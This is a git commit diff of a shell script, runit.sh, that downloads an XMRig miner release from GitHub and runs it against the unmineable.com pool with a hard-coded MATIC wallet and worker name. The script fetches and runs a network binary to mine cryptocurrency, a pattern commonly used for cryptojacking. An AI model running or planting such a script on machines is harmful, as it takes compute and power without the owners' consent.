b2f3896bac2b368a32cbaf867ec7080505299fca
dirayasa <dimas.hendrajs@gmail.com>
2022-07-15 16:32:30 +0700

    Update runit.sh

--- runit.sh
+++ runit.sh
@@ -1,5 +1,5 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
-tar -xf xmrig-6.18.0-linux-x64.tar.gz
-cd xmrig-6.18.0/
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
 ./xmrig -o rx.unmineable.com -a rx -k -u MATIC:0xaf06924E575FaCad9B7693D95636B924609A06DC.mincpu1 -p x
